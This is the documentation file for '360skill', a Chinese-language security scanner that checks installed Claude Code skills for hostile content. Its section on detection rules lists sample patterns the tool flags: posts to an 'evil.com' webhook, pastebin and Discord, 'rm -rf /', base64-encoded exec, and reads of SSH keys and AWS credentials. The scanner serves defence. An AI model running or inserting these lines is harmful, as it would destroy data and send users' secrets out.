---
name: 360skill
description: Security scanner for installed skills. Automatically detects suspicious content like credential theft, malicious scripts, and data exfiltration. Provides interactive risk assessment with options to quarantine or delete risky skills. Use when installing new skills or periodically scanning existing skills for security issues.
license: MIT
---

# 360skill - Skill 安全卫士

360skill 是一个专门用于检测和防护恶意技能的安全扫描工具。它可以自动检测已安装 skill 中的可疑内容，包括敏感信息泄露、恶意脚本、数据外传等安全风险。

## 功能特性

### 核心功能

1. **自动检测新安装的 skill** - 通过 Hook 方式在安装时自动扫描
2. **手动扫描已安装的 skill** - 支持三种检测模式
3. **风险报告和评估** - 详细的风险分类和修复建议
4. **交互式删除** - 一键删除有风险的 skill

### 检测模式

#### 基础检测 (basic)
- 敏感词检测（API Key、Token、密码等）
- 危险命令检测（rm -rf、eval、exec 等）
- 可疑网络请求

#### 深度检测 (deep) - 默认模式
- 包含基础检测所有内容
- 代码混淆检测
- 可疑文件操作
- 数据外传检测
- Shell 命令注入

#### 全量检测 (full)
- 包含深度检测所有内容
- 行为分析（无限循环、延迟攻击等）
- 环境指纹采集
- 持久化机制（Hook、定时任务等）

## 使用方法

### 场景 1: 扫描所有已安装的 skill

使用交互式扫描，可以查看风险并选择是否删除：

```bash
python ~/.claude/skills/360skill/scripts/interactive_scan.py
```

或者使用快速扫描模式：

```bash
# 默认深度检测
python ~/.claude/skills/360skill/scripts/scan_skills.py

# 基础检测
python ~/.claude/skills/360skill/scripts/scan_skills.py --level basic

# 全量检测
python ~/.claude/skills/360skill/scripts/scan_skills.py --level full
```

### 场景 2: 扫描单个 skill

```bash
python ~/.claude/skills/360skill/scripts/scan_skills.py --skill <skill-name>
```

### 场景 3: JSON 格式输出（用于脚本集成）

```bash
python ~/.claude/skills/360skill/scripts/scan_skills.py --json
```

### 场景 4: 新技能安装时自动检测

在 Claude Code 的 settings.json 中配置 pre-skill-install hook：

```json
{
  "hooks": {
    "pre-skill-install": "~/.claude/skills/360skill/scripts/scan_skills.py --level deep"
  }
}
```

这样每次安装新 skill 时，会自动进行深度检测。

## 输出说明

### 风险等级

- 🚨 **严重 (CRITICAL)** - 危险命令、Shell 注入、持久化机制
- 🔴 **高 (HIGH)** - 敏感信息泄露、数据外传、代码混淆
- 🟡 **中 (MEDIUM)** - 可疑文件操作、可疑网络请求、异常行为
- 🟢 **低 (LOW)** - 其他可疑模式

### 报告格式

扫描报告会显示：
1. 扫描统计（总数、安全数、风险数）
2. 按风险等级分类的 skill 列表
3. 每个风险点的详细信息：
   - 风险描述
   - 文件位置和行号
   - 代码片段
   - 修复建议

## 检测规则详解

### 1. 敏感信息泄露 (sensitive_api_keys)
检测硬编码的 API Key、Token、密码等敏感信息。

**示例检测：**
```python
# ❌ 危险：硬编码 API Key
api_key = "sk-1234567890abcdef"

# ✅ 安全：使用环境变量
api_key = os.environ.get("API_KEY")
```

### 2. 危险命令执行 (dangerous_commands)
检测危险的系统命令执行。

**示例检测：**
```python
# ❌ 危险：直接执行用户输入
os.system(user_input)

# ❌ 危险：eval 动态执行
eval(user_code)

# ❌ 危险：删除命令
os.system("rm -rf /")
```

### 3. 代码混淆 (code_obfuscation)
检测可能的代码混淆技术。

**示例检测：**
```python
# ❌ 可疑：大量转义字符
code = "\x74\x65\x73\x74"

# ❌ 可疑：Base64 混淆
exec(base64.b64decode("..."))

# ❌ 可疑：字符编码混淆
eval(chr(116)+chr(101)+chr(115)+chr(116))
```

### 4. 数据外传 (data_exfiltration)
检测可能的数据外传行为。

**示例检测：**
```python
# ❌ 可疑：发送到 pastebin
requests.post("https://pastebin.com/api/post", data= sensitive_data)

# ❌ 可疑：Webhook 发送
requests.post("https://evil.com/webhook", json=data)

# ❌ 可疑：Discord webhook
requests.post(f"https://discord.com/api/webhooks/{webhook}", data=logs)
```

### 5. 可疑文件操作 (suspicious_file_ops)
检测对敏感目录的访问。

**示例检测：**
```python
# ❌ 可疑：访问 SSH 密钥
open("~/.ssh/id_rsa", "r")

# ❌ 可疑：访问 AWS 凭证
open("~/.aws/credentials", "r")
```

## Hook 配置指南

### 方法 1: 使用 settings.json 配置

编辑 `~/.claude/settings.json`：

```json
{
  "hooks": {
    "pre-skill-install": "python ~/.claude/skills/360skill/scripts/scan_skills.py --skill {skill_name} --level deep"
  }
}
```

### 方法 2: 使用环境变量

```bash
export CLAUDE_PRE_SKILL_INSTALL="python ~/.claude/skills/360skill/scripts/scan_skills.py --skill {skill_name}"
```

## 故障排除

### 扫描失败

如果扫描失败，检查：
1. Python 版本是否为 3.6+
2. 是否有读取 skills 目录的权限
3. 文件编码是否正确（脚本会自动忽略无法读取的文件）

### 误报处理

如果发现误报，可以：
1. 使用 `--level basic` 降低检测级别
2. 手动审查相关代码
3. 将误报情况反馈给 360skill 维护者

### 性能优化

- 对于大量 skill，使用 `--level basic` 加快扫描
- 扫描单个 skill 使用 `--skill` 参数
- 使用 `--json` 输出便于脚本处理

## 安全建议

1. **定期扫描** - 建议每周扫描一次已安装的 skill
2. **安装前检查** - 使用 Hook 自动检测新安装的 skill
3. **谨慎删除** - 删除前查看详细风险信息
4. **保持更新** - 定期更新 360skill 以获取最新检测规则

## 技术细节

### 扫描原理

360skill 使用正则表达式模式匹配来检测潜在风险。扫描器会：
1. 遍历 skills 目录
2. 读取所有支持的文件类型（.py, .js, .ts, .sh, .md, .json 等）
3. 使用预定义的模式进行匹配
4. 对每个匹配生成风险报告

### 支持的文件类型

- Python: `.py`
- JavaScript/TypeScript: `.js`, `.ts`
- Shell: `.sh`, `.bash`
- 配置文件: `.json`, `.yml`, `.yaml`
- 文档: `.md`, `.txt`

### 性能考虑

- 使用编译后的正则表达式提高性能
- 默认跳过 360skill 自身
- 按需加载检测模式

## 许可证

MIT License - 自由使用、修改和分发。

## 贡献

欢迎提交问题报告和改进建议！
